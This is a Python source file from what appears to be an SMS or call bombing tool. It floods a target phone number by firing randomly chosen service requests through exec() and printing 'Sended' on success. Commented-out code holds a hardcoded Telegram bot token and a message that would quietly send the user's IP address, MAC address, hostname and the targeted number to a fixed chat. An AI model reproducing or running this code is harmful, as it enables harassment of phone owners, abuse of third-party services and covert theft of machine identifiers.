from StructPacket import Service
from config import services
import random, time
from colorama import Fore,Back
import telebot
import socket
import re, uuid


h_name = socket.gethostname()
ipadr = socket.gethostbyname(h_name)
#bot = telebot.TeleBot('1566531385:AAExWCHvaZ9I3kkMhefAxWuGYVt79hfIXyw')

class Distribution_Service():
    def __init__(self):
        self.number_attack = Service()
        self.services = services

    def phone(self, phone):
        self.number_attack.number(phone)

    def random_service(self):
        try:
            self.service = random.choice(self.services) 
            exec(f'self.number_attack.{self.service}()')
            print(Fore.GREEN + Back.RESET+ f'[  💡  ] Gönderildi ||Sended [  👋  ]   {Back.LIGHTWHITE_EX +Fore.BLACK + self.service}')
           #bot.send_message(961991483, 'IP Adress 🤖:  ' +ipadr + '\nMac Adress 💻 : ' + "  " +':'.join(re.findall('..', '%012x' %uuid.getnode()))+ '\nPC NAME 👨‍💻: ' +"   "+h_name +'Gönderlien Numara: '+ phone)
        except Exception as ex: 
            pass


